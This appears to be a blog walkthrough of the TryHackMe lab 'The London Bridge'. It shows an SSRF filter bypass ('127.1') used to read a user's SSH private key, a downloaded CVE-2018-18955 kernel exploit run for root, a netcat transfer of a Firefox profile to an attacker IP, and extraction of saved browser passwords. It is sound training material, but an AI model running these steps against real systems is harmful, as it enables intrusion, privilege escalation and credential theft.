---
title: The London Bridge
date: 2024-09-28 21:59:00 +0200
categories:
  - TryHackMe
tags:
  - Web
  - SSRF
  - CVE-2018-18955
  - Kernel-Exploit
  - Browser-Passwords

description: The London Bridge is falling down.
render_with_liquid: false
media_subpath: /assets/img/thm_images/tryhackme_TheLondonBridge
image:
  path: room.png
---
## Room
![Room Card](room_card.png){: w="300" h="300" .center .shadow}

- **Title:** LondonBridge
- **Name:** [The London Bridge](https://tryhackme.com/r/room/thelondonbridge)
- **Description:** The London Bridge is falling down.
- **Creator**: [Sharib](https://tryhackme.com/p/Sharib)

### Flags

1. What is the user flag?
2. What is the root flag?
3. What is the password of charles?

## Initial Recon
After scanning the target with `nmap`, we can see that **port 8080** is open.
```console
m3ga@kali:~$ nmap -sS -Pn -v -p- -T4 -A -oN portscan.nmap 10.10.106.27
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA)
|   256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA)
|_  256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519)
8080/tcp open  http-proxy gunicorn
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-title: Explore London
```

There's a website running on port 8080.

![](<Pasted image 20240928141418.png>){: w="700" h="300" .center }

After some enumeration, we find that we are able to uploads pictures in `http://10.10.106.27:8080/gallery`

![](<Pasted image 20240928141529.png>){: w="700" h="300" .center }

Since the background server running is `gunicord`, we can't just upload a php-reverse-shell or something like that to get access so this is pretty much useless.


After further enumeration `/dejaview` is found.
```text
http://10.10.106.27:8080/contact              (Status: 200) [Size: 1703]
http://10.10.106.27:8080/feedback             (Status: 405) [Size: 178]
http://10.10.106.27:8080/gallery              (Status: 200) [Size: 1722]
http://10.10.106.27:8080/upload               (Status: 405) [Size: 178]
http://10.10.106.27:8080/dejaview             (Status: 200) [Size: 823]
```

Here we can view images by providing a link.

![](<Pasted image 20240928160428.png>){: w="400" h="300" .center }

## User Flag
### SSRF

After intercepting the upload request, we see that the paramter is called `image_url`

![](<Pasted image 20240928220051.png>){: w="600" h="300" .center }

As the hint suggests, fuzzing for other parameters, we find that `www` is also there:
![](<Pasted image 20240928160312.png>){: w="700" h="300" .center }

In CTFs, this usually suggests that an internal web server/service is running locally. But enumerating for open ports using `www=127.0.0.1:<port>` gives us a `405 not allowed` response. Even with **port 8080** which we know is open.

Changing the payload to `www=127.1:8080` helps us bypass this.

![](<Pasted image 20240928162411.png>){: w="700" h="300" .center }

Fuzzing for open local ports we find that **port 80** is open.

![](<Pasted image 20240928162549.png>){: w="700" h="300" .center }

It seems like there is an internal web server running as previously thought.
![](<Pasted image 20240928162629.png>){: w="700" h="300" .center }

Fuzzing for directories on this internal server we don't find anything useful at first.
```console
m3ga@kali:~$ wfuzz -u "http://10.10.106.27:8080/view_image" -d 'www=http://127.1:80/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c --hw 37
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload        
=====================================================================
000000067:   200        43 L     115 W      1294 Ch     "templates"              
000000150:   200        21 L     43 W       630 Ch      "uploads"
000000255:   200        17 L     35 W       420 Ch      "static"
```

After spending some time and not making any progress, I  fuzzed this again with another wordlist which gave me a lot more back.
```console
m3ga@kali:~$ wfuzz -u "http://10.10.106.27:8080/view_image" -d 'www=http://127.1:80/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -c --hw 37 
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000011:   200        43 L     115 W      1294 Ch     "templates"
000000113:   200        21 L     43 W       630 Ch      "uploads"
000000272:   200        17 L     35 W       420 Ch      "static"
000000400:   200        36 L     161 W      1270 Ch     "."
000001950:   200        17 L     35 W       474 Ch      ".cache"
000002572:   200        17 L     35 W       414 Ch      ".local"
000008706:   200        16 L     33 W       399 Ch      ".ssh"
```

The `.ssh` directory contains two files `id_rsa` and `authorized_keys`.

![](<Pasted image 20240928165436.png>){: w="700" h="300" .center }

The `id_rsa` file is a private key. 
![](<Pasted image 20240928220819.png>){: w="700" h="300" .center }

The `authorized_keys` file contains a public key of a user called `beth`.

![](<Pasted image 20240928220928.png>){: w="700" h="300" .center }

After copying the private key to our own machine, we can successfully SSH into the system using the private key and the username `beth`.

The `user.txt` file can be found inside the `__pycache__` folder.
```console
m3ga@kali:~$ nano id_rsa_beth
# paste private key and save
m3ga@kali:~$ chmod 600 id_rsa_beth 
m3ga@kali:~$ ssh beth@10.10.106.27 -i id_rsa_beth 
...
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)
...
beth@london:~$ cd __pycache__/
beth@london:~/__pycache__$ ls
app.cpython-36.pyc  gunicorn_config.cpython-36.pyc  user.txt
beth@london:~/__pycache__$ cat user.txt 
THM{[REDACTED]}
```

## Root Flag
### Enumeration
After running `linpeas` on the system, it shows that there are some services which are using binaries inside `beth`'s home directory, but it wasn't possible to do anything with them.

The kernel running on the machine seems to be outdated.
```console
beth@london:~$ uname -a
Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

### CVE-2018-18955
`linpeas` suggests that `[CVE-2018-18955] subuid_shell` kernel exploit might help to escalate privileges.

> [nist.gov](https://nvd.nist.gov/vuln/detail/CVE-2018-18955) - CVE-2018-18955
> 
> In the Linux kernel 4.15.x through 4.19.x before 4.19.2, map_write() in kernel/user_namespace.c allows privilege escalation because it mishandles nested user namespaces with more than 5 UID or GID ranges. A user who has CAP_SYS_ADMIN in an affected user namespace can bypass access controls on resources outside the namespace, as demonstrated by reading /etc/shadow. This occurs because an ID transformation takes place properly for the namespaced-to-kernel direction but not for the kernel-to-namespaced direction.
{: .prompt-info}

`scheatkode` on GitHub already has everything we need to exploit this.

> [GitHub PoC](https://github.com/scheatkode/CVE-2018-18955) - CVE-2018-18955
> 
> Linux local root exploit. 
> Wrapper for Jann Horn's exploit for CVE-2018-18955, forked from kernel-exploits.
{: .prompt-tip}

After downloading the release [linux-x86_64.tar.gz](https://github.com/scheatkode/CVE-2018-18955/releases/download/v0.0.1/linux-x86_64.tar.gz) and getting it on the target machine, I ran some of the bash scripts. The one that worked for me was `exploit.dbus.sh`.

The `root.txt` file can be found inside root's home directory.

```console
beth@london:~$ tar -xvf ./linux-x86_64.tar.gz && cd linux-x86_64
beth@london:~/linux-x86_64$ ./exploit.dbus.sh 
[*] Compiling...
[*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
[.] starting
[.] setting up namespace
...
[+] Success:
-rwsrwxr-x 1 root root 8392 Sep 28 08:46 /tmp/sh
[*] Cleaning up...
[*] Launching root shell: /tmp/sh
root@london:~/linux-x86_64# id
uid=0(root) gid=0(root) groups=0(root),1000(beth)
root@london:/root# cat .root.txt 
THM{[REDACTED]}
```

## Charles's Password
Once I got root, I tried cracking `charles`'s hash inside `/etc/shadow` with no luck. That's when I found a directory called `.mozilla` inside `charles`'s home directory.

This folder usually contains `firefox` profiles which contains saved credentials inside the browser. Let's compress the folder and download it to our local machine.

```console
root@london:/home/charles# tar -cvf mozilla.tar ./.mozilla/
root@london:/home/charles# nc 10.11.75.248 4545 < mozilla.tar

m3ga@kali:~$ nc -lvnp 4545 > mozilla.tar
m3ga@kali:~$ tar -xvf mozilla.tar
```

`unode` on GitHub has a script which can go through these profiles and extract the credentials.

> [GitHub](https://github.com/unode/firefox_decrypt) - firefox_decrypt
> 
> Firefox Decrypt is a tool to extract passwords from profiles of Mozilla (Fire/Water)fox™, Thunderbird®, SeaMonkey® and derivates. 
> It can be used to recover passwords from a profile protected by a Master Password as long as the latter is known. If a profile is not protected by a Master Password, passwords are displayed without prompt.
{: .prompt-tip}

Running this script on `charles`'s profile, we can successfully extract his password.
```console
m3ga@kali:~$ chmod 777 ./.mozilla -R
m3ga@kali:~$ /opt/firefox_decrypt/firefox_decrypt.py ./.mozilla/firefox/8k3bf3zp.charles 
...

Website:   https://www.buckinghampalace.com
Username: 'Charles'
Password: '[REDACTED]'
```

## Outro
Many thanks to the creator the room, [Sharib](https://tryhackme.com/p/Sharib).

This was a great room and a good refresher on SSRF for me.

\- m3gakr4nus
